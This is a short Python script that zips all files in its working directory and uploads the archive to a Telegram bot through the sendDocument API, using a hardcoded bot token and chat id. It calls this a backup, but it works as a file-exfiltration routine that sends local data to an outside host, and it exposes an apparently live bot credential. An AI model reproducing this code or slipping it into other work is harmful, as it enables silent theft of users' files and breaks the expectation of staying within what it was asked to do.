from time import sleep
import os
import requests

token = "5413423761:AAGqHrQWURG-gUoHTMuEnevbUhSNxDeQVxw"
chat_id = "5062547281"
os.system("zip -r backup.zip *")
backup = open("backup.zip" , 'rb')
url = ("https://api.telegram.org/bot"+token+"/sendDocument?chat_id="+chat_id)
url_backup = requests.post(url, files={'document': backup})
print(url_backup.json())
sleep(3600)
